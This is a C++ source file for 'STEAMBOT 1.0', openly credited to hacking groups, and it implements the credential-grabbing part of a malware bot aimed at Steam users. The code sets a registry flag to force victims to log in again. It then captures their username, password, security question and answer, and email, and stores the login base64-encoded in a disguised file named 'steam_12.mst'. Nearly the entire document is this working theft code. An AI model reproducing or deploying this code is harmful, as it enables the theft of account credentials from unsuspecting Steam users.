#include "includes.h"
#include "steaminfo.h"
#include "base64.h"

/************************************************************************************/
/* STEAMBOT 1.0 source by s0beit - greetz											*/
/* myg0t.com																		*/
/* bottalk.us																		*/
/* milw0rm.com																		*/
/* irc.lcirc.net #myg0t, #bottalk, #milw0rm											*/
/* irc.fuckurinter.net #FYINet to support me for no real reason :p					*/
/************************************************************************************/

cSteamInfo::cSteamInfo()
{


	//default name
	HashFilename = "steam_12.mst";

	//check for hash data
	if( !this->HashFileExists() )
	{
		//create the file
	}
}

cSteamInfo::~cSteamInfo()
{

}

/* used to force a login to grab the data */
void cSteamInfo::SetRefreshLoginRequired( DWORD m_iRequired )
{
	HKEY hKey;
	RegOpenKeyExA( HKEY_CURRENT_USER, 
		"Software\\Valve\\Steam", 0, 
		KEY_SET_VALUE, &hKey );

	RegSetValueExA( hKey, "RefreshLoginRequired", 
		0, REG_DWORD, (LPBYTE) &m_iRequired, sizeof( DWORD ) );

	RegCloseKey( hKey );
}

/* this is used for password information exclusively */
void cSteamInfo::OnLogin( const char *szUser, const char *szPass )
{
	this->Username			= szUser;
	this->Password			= szPass;

	if( this->HashFileExists() )
	{
		if( !this->PasswordFileMatch( szUser, szPass ) )
		{
			//the hash file exists, but the password doesnt match
			this->KillHashFile();
		}
	}

	//create the new file after the check
	//but ALWAYS create it :p
	this->CreatePasswordHashFile( szUser, szPass );
}

void cSteamInfo::OnNewPass( const char *CurrentPass, const char *NewPass )
{
	this->Password			= NewPass;

	if( this->HashFileExists() )
	{
		//the password has been changed and we must force the user to login now
		this->KillHashFile();
	}
}

void cSteamInfo::OnSecretQ( const char *OldQ, const char *NewQ, const char *A )
{
	this->OldQuestion		= OldQ;
	this->NewQuestion		= NewQ;
	this->QuestionAnswer	= A;
}

void cSteamInfo::OnEmail( const char *szNewEmail )
{
	this->Email = szNewEmail;
}

/* password hashing, used to make sure people are only */
/* forced to login after their data has changed or */
/* doesn't yet exist */
void cSteamInfo::KillHashFile()
{
	remove( HashFilename.c_str() );
}

bool cSteamInfo::HashFileExists()
{
	FILE *pFile = fopen( HashFilename.c_str(), "rb" );
	
	if( pFile == NULL )
		return false;

	return true;
}

void cSteamInfo::CreatePasswordHashFile( const char *szUser, const char *szPass )
{
	FILE *pFile = fopen( HashFilename.c_str(), "wb" );

	if( pFile == NULL )
		return;

	string fmt = GetFormatString( szUser, szPass );
	string encoded = base64_encode( (const unsigned char*)fmt.c_str(), (unsigned int)fmt.size() );

	fwrite( encoded.c_str(), 1, encoded.size(), pFile );
	fclose( pFile );
}

bool cSteamInfo::PasswordFileMatch( const char *szUser, const char *szPass )
{
	bool bIsMatch = false;

	FILE *pFile = fopen( HashFilename.c_str(), "rb" );
	
	if( pFile == NULL )
		return false;

	fseek( pFile, 0, SEEK_END );
	long fileSize = ftell( pFile );
	rewind( pFile );

	char *szBuffer = (char*)malloc( sizeof(char)*fileSize );
	
	if( szBuffer == NULL )
		return false;
	
	size_t iResult = fread( szBuffer, 1, fileSize, pFile );

	if( iResult != fileSize )
		return false;

	//unencrypt + check data here
	string decode_data = base64_decode( szBuffer );

	if( !strcmp( decode_data.c_str(), GetFormatString( szUser, szPass ).c_str() ) )
	{
		bIsMatch = true;
	}

	fclose( pFile );
	free( szBuffer );

	return bIsMatch;
}

string cSteamInfo::GetFormatString( const char *szUser, const char *szPass )
{
	string format_go = szUser;
	format_go.append( "-" );
	format_go.append( szPass );
	return format_go;
}

void cSteamInfo::SetHashFilename( const char *szFilename )
{
	this->HashFilename = szFilename;
}

